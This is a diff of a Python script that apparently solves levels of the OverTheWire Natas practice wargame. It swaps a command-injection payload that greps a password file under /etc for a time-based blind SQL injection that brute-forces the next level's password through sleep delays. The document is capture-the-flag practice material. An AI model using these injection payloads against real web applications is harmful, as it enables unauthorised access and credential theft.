@@ -1,10 +1,10 @@
 
 import re,requests,base64,natas,string
 
-USER='natas16'
+USER='natas17'
 PASSWORD=natas.get_credential(USER)
 
-URL='http://natas16.natas.labs.overthewire.org/index.php'
+URL='http://natas17.natas.labs.overthewire.org/index.php'
 
 def main():
     b64 = base64.b64encode('%s:%s' % (USER,PASSWORD))
@@ -15,7 +15,7 @@ def main():
         found = False
         for c in string.ascii_letters + string.digits :
             if (guessed_correct(password + c, b64)):
-                password = password + c
+                password += c
                 found = True
                 print(password)
                 break
@@ -25,28 +25,26 @@ def main():
     if (len(password) > 30):
         print('found password: %s' % password)
         print('adding to credentials....')
-        natas.save_credentials('natas17',password)
+        natas.save_credentials('natas18',password)
         print('done')
 
             
 
 def guessed_correct(password, b64):
-    regex = r"giraffes"
-    QUERY='giraffes$(grep -e ^%s /etc/natas_webpass/natas17)' % password
+    QUERY='natas18" and password like binary "%s%s" and sleep(5) #' % (password,'%')
     
-    response = requests.get(
-            URL,
-            headers=dict(Authorization='Basic %s' % b64),
-            params=dict(needle=QUERY,submit="Search")
-    )
-    
-    correct = True
-    matches = re.finditer(regex,response.content,re.MULTILINE)
-    for match in matches:
-        correct = False
+    try:
 
-    return correct
-
+        response = requests.post(
+                URL,
+                headers=dict(Authorization='Basic %s' % b64),
+                data={'username' : QUERY},
+                timeout=1
+        )
+        
+        return False
+    except Exception as e:
+        return True
 
 if __name__=='__main__':
     main()
